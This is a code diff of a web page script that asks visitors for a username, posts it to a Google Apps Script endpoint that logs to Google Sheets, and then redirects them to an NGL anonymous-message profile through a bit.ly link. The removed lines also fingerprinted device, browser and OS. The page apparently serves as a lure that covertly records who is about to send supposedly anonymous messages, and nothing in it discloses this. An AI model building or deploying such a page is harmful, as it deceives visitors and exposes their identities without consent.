@@ -164,7 +164,7 @@ p{
 <script>
 
 // 🔥 GOOGLE SHEETS WEB APP URL (ILAGAY MO DITO)
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxQHbRJ8PDupCxvNcCPP27gwIYDmAPBNQ0jIANeOtf_7lkGL13lPA5TUIzuWAkR9e7ghA/exec";
+const SCRIPT_URL = "PASTE_GOOGLE_SCRIPT_URL_HERE";
 
 function openModal(){
     document.getElementById("modal").style.display = "flex";
@@ -172,50 +172,24 @@ function openModal(){
 
 async function sendAndRedirect(){
 
-    const username = document.getElementById("username").value.trim();
+    const username =
+    document.getElementById("username").value.trim();
 
     if(!username){
         alert("Enter username");
         return;
     }
 
-    const userAgent = navigator.userAgent;
-
-    // DEVICE
-    const device = /Mobi|Android|iPhone/i.test(userAgent)
-        ? "Mobile"
-        : "Desktop";
-
-    // BROWSER
-    let browser = "Unknown";
-    if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Chrome";
-    else if (userAgent.includes("Firefox")) browser = "Firefox";
-    else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
-    else if (userAgent.includes("Edg")) browser = "Edge";
-
-    // OS
-    let os = "Unknown";
-    if (userAgent.includes("Windows")) os = "Windows";
-    else if (userAgent.includes("Android")) os = "Android";
-    else if (userAgent.includes("iPhone") || userAgent.includes("iOS")) os = "iPhone";
-    else if (userAgent.includes("Mac")) os = "MacOS";
-
-    console.log("DEBUG:", { username, device, browser, os });
-
+    // SEND TO GOOGLE SHEETS
     await fetch(SCRIPT_URL, {
         method: "POST",
-        headers: {
-            "Content-Type": "text/plain"
-        },
         body: JSON.stringify({
-            username,
-            device,
-            browser,
-            os
+            username: username
         })
     });
 
-    window.location.href = "https://ngl.link/rflorentino_";
+    // redirect to NGL
+    window.location.href = "https://bit.ly/rflorentino_";
 }
 
 </script>
